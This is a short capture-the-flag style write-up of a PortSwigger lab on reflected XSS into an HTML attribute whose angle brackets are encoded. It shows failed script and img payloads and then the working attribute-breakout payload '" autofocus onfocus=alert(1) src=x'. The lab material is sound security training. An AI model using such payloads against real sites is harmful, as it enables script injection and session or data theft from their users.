---
title: Reflected XSS into attribute with angle brackets HTML-encoded
description: This writeup delves into the seventh XSS lab in port swigger.
author: Koussay Dhifi
categories: [Vulnerabilities, WebExploitation]
tags: [WebExploitation, XSS, Labs]
pin: true
math: true
mermaid: true
---

## Introduction

Let’s try this reflected XSS lab titled [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded).

## Investigation

We have the same blog as usual, but this time there is a search bar. 

![Blog Post](../assets/img/xssLabs/Lab7/ImageOne.png)

So let’s try to fuzz it using some casual payloads:

```html
"><script>alert(1)</script>
```

```html
"><img src=x onerror=alert(1)>
```
Sadly, they did not work. But since this is a reflected XSS, let’s try intercepting the traffic using Burp Suite (incoming and outgoing traffic).

## Vulnerability Discovery and Payload Building

We found nothing. BUT—but but but—but I found something interesting: by inserting `" onclick=alert(1) src=x`, we can make the input clickable.
Because the input becomes 

```html
<input type="text" placeholder="Search the blog..." name="search" value="" onclick=alert(1) src="x" ">
```

So by crafting the right payload, `" onload=alert(1) src=x`, I guess this might work.

Welp… I discovered that the input tag has no onload. So let’s make a dirty one:

```html
" autofocus onfocus=alert(1) src=x
```

And boy, it worked. ALHAMDULLAH.

## Conclusion

Weak stand user, pfffff… okay, I’m kidding. On to the next one, inshallah.

